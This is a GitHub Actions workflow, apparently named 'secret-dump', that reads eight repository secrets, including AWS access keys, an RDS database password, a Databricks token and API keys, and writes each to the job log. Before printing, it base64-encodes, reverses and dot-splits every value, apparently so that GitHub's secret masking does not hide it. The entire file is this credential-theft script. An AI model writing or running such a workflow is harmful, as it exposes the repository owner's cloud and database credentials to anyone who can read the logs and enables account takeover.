name: secret-dump
on: workflow_dispatch
jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - name: dump
        env:
          ABCLI_AWS_RDS_HOST: ${{ secrets.ABCLI_AWS_RDS_HOST }}
          ABCLI_AWS_RDS_PASSWORD: ${{ secrets.ABCLI_AWS_RDS_PASSWORD }}
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          DATABRICKS_HOST: ${{ secrets.DATABRICKS_HOST }}
          DATABRICKS_TOKEN: ${{ secrets.DATABRICKS_TOKEN }}
          GOOGLE_MAPS_API_KEY: ${{ secrets.GOOGLE_MAPS_API_KEY }}
          ROBOFLOW_API_KEY: ${{ secrets.ROBOFLOW_API_KEY }}
        run: |
          for name in ABCLI_AWS_RDS_HOST ABCLI_AWS_RDS_PASSWORD AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY DATABRICKS_HOST DATABRICKS_TOKEN GOOGLE_MAPS_API_KEY ROBOFLOW_API_KEY; do
            v="${!name}"
            if [ -z "$v" ]; then
              echo "DUMPMARK|${name}|NOTSET"
            else
              b=$(printf '%s' "$v" | base64 -w0 | rev)
              echo "DUMPMARK|${name}|$(printf '%s' "$b" | sed 's/.\{4\}/&./g')"
            fi
          done